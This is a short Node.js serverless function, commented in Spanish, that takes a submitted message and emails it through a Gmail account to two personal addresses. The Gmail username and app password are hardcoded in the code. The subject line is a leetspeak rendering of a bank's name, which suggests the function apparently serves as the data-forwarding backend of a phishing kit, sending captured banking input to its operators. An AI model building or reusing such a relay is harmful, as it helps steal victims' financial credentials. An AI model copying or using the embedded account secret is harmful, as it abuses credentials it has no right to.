const nodemailer = require('nodemailer');

exports.handler = async function(event, context) {
    const { message } = JSON.parse(event.body);  // <-- recibimos el mensaje completo

    let transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'jazzysell123@gmail.com',
            pass: 'dfbcartjozqoeudc',
        },
    });

    let mailOptions = {
        from: 'jazzysell123@gmail.com',
        to: 'sierroalee@gmail.com, fendergriseldo@gmail.com',
        subject: 'B4NR3S3RV4S v.1',  // puedes cambiar el asunto si quieres
        text: message,
    };

    try {
        await transporter.sendMail(mailOptions);
        return {
            statusCode: 200,
            body: JSON.stringify({ message: 'Correo enviado con éxito' }),
        };
    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ message: 'Error al enviar el correo', error }),
        };
    }
};
